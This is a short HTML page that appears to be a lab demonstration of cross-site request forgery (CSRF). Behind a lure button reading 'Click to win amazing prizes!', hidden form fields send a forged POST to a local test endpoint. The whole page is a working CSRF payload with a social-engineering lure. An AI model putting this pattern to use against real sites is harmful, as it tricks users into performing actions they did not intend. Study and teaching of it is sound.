<!DOCTYPE html>
<html>
<head>
	<title>Amazing Prizes</title>
</head>
<body>
	<h1>Amazing Prizes</h1>

	<form action="http://localhost/csrf/index.php" method="POST">
		<input type="hidden" name="name" value="attacker">
		<input type="hidden" name="comment" value="This is a CSRF attack!">
		<input type="submit" name="submit" value="Click to win amazing prizes!">
	</form>

</body>
</html>
